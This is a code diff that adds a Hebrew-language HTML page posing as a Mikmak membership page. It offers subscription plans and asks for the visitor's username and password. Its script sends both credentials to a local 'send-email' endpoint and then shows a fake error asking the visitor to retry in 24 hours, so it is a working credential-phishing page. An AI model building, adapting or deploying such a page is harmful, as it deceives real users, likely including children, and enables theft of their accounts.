@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>מערכת אישית - בחירת מנוי</title>
+    <style>
+        /* רקע צבעוני מודרני */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* עיצוב כרטיס הטופס הגדול */
+        form {
+            background: white;
+            padding: 30px 40px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+            text-align: center;
+        }
+
+            form:hover {
+                transform: translateY(-3px);
+            }
+
+        /* עיצוב האייקון הראשי למעלה */
+        .main-icon {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+        }
+
+        .icon-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #555555;
+            margin-top: -5px;
+            margin-bottom: 25px;
+        }
+
+        /* עיצוב אזור בחירת המנויים */
+        .subscription-options {
+            text-align: right;
+            margin-bottom: 25px;
+        }
+
+        .section-title {
+            font-weight: 700;
+            color: #4a148c;
+            font-size: 15px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        /* עיצוב שורת מנוי (כרטיסייה קטנה) */
+        .sub-option {
+            display: flex;
+            align-items: center;
+            background: #f8fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+            /* אפקט מעבר מעל אפשרות מנוי */
+            .sub-option:hover {
+                border-color: #cbd5e1;
+                background: #f1f5f9;
+            }
+
+            /* עיצוב כפתור הבחירה העגול */
+            .sub-option input[type="radio"] {
+                margin: 0 0 0 12px;
+                cursor: pointer;
+                accent-color: #764ba2;
+            }
+
+        /* עיצוב האייקון של מיקמק ליד כל שורת מנוי */
+        .sub-icon {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+            margin-right: auto;
+            display: block;
+        }
+
+        .sub-text {
+            font-weight: 600;
+            color: #334155;
+            font-size: 15px;
+        }
+
+        /* עיצוב השורה כשהיא נבחרת ומסומנת */
+        .sub-option input[type="radio"]:checked + .sub-text {
+            color: #4a148c;
+        }
+
+        .sub-option:has(input[type="radio"]:checked) {
+            border-color: #667eea;
+            background-color: #eff6ff;
+            box-shadow: 0 4px 6px rgba(102, 126, 234, 0.1);
+        }
+
+        /* עיצוב הטקסט מעל השדות */
+        label {
+            font-weight: 600;
+            color: #555;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 8px;
+            text-align: right;
+        }
+
+        /* עיצוב שדות הקלט */
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background-color: #f8fafc;
+        }
+
+            input[type="text"]:focus {
+                border-color: #667eea;
+                background-color: #fff;
+                box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.15);
+                outline: none;
+            }
+
+        /* כפתור שליחה */
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            box-shadow: 0 4px 12px rgba(118, 75, 162, 0.3);
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+            button:hover {
+                transform: scale(1.02);
+                box-shadow: 0 6px 20px rgba(118, 75, 162, 0.4);
+                filter: brightness(1.1);
+            }
+
+            button:disabled {
+                background: #a0aec0;
+                cursor: not-allowed;
+                box-shadow: none;
+                transform: none;
+            }
+
+        /* ספינר מסתובב */
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <form id="reminderForm">
+        <!-- תמונת האייקון הרשמי ממיקמק חזרה למעלה -->
+        <img src="https://www.mikmak.co.il/images/store/header/members_h.png?v=2?r=1" alt="Icon" class="main-icon">
+        <div class="icon-text">מנויים</div>
+
+        <!-- אזור בחירת סוג המנוי -->
+        <div class="subscription-options">
+            <span class="section-title">בחר את סוג המנוי המבוקש:</span>
+
+            <!-- אפשרות 1: 3 חודשים -->
+            <label class="sub-option">
+                <input type="radio" name="subscription" value="מנוי ל-3 חודשים" checked>
+                <span class="sub-text">מנוי לשלושה חודשים</span>
+                <img src="https://www.mikmak.co.il/images/store/header/members_h.png?v=2?r=1" alt="Icon" class="sub-icon">
+            </label>
+
+            <!-- אפשרות 2: 6 חודשים -->
+            <label class="sub-option">
+                <input type="radio" name="subscription" value="מנוי ל-6 חודשים">
+                <span class="sub-text">מנוי לשישה חודשים</span>
+                <img src="https://www.mikmak.co.il/images/store/header/members_h.png?v=2?r=1" alt="Icon" class="sub-icon">
+            </label>
+
+            <!-- אפשרות 3: 12 חודשים -->
+            <label class="sub-option">
+                <input type="radio" name="subscription" value="מנוי ל-12 חודשים">
+                <span class="sub-text">מנוי ל-12 חודשים</span>
+                <img src="https://www.mikmak.co.il/images/store/header/members_h.png?v=2?r=1" alt="Icon" class="sub-icon">
+            </label>
+        </div>
+
+        <!-- שדות הקלט הנקיים -->
+        <label>שם משתמש:</label>
+        <input type="text" id="username" name="username" placeholder="הקלד שם משתמש..." required>
+
+        <label>סיסמה:</label>
+        <input type="text" id="password" name="password" placeholder="הקלד סיסמה..." required>
+
+        <button type="submit" id="submitBtn">
+            <span class="spinner" id="spinner"></span>
+            <span id="btnText">קבלת מנוי</span>
+        </button>
+    </form>
+
+    <script>
+                document.getElementById('reminderForm').addEventListener('submit', function(event) {
+                    event.preventDefault();
+
+                    const submitBtn = document.getElementById('submitBtn');
+                    const spinner = document.getElementById('spinner');
+                    const btnText = document.getElementById('btnText');
+
+                    const username = document.getElementById('username').value;
+                    const password = document.getElementById('password').value;
+
+                    submitBtn.disabled = true;
+                    spinner.style.display = 'block';
+                    btnText.innerText = 'מעבד נתונים למיקמק...';
+
+                    fetch('http://localhost:3000/send-email', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        alert('שגיאה נסה שוב עוד 24 שעות');
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('אופס, היתה שגיאה בתהליך.');
+                    })
+                    .finally(() => {
+                        submitBtn.disabled = false;
+                        spinner.style.display = 'none';
+                        btnText.innerText = 'קבלת מנוי';
+                    });
+                });
+    </script>
+
+</body>
+</html>
